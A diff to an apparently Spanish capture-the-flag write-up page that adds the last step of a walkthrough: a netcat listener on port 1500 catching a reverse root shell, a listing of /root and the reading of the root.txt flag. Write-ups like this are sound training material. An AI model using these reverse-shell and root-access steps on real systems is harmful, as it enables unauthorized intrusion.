@@ -386,6 +386,20 @@ import pty
 pty.spawn("sh")
 </code></pre></div></div><br>
 
+<p class="plain-text">Al ejecutar el comando recibiremos la root shell por el puerto 1500.</p>
+
+<div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
+<code><span class="am">└─$ nc -lvnp 1500</span>
+listening on [any] 1500 ...
+root# ls /root
+ecosystem.config.js 
+root.txt 
+scripts 
+snap
+root# cat /root/root.txt
+<span class="am">87bef491ca430e840eef770a3ce41fd</span>
+</code></pre></div></div><br>
+
 </section>
 </article>
   </div>
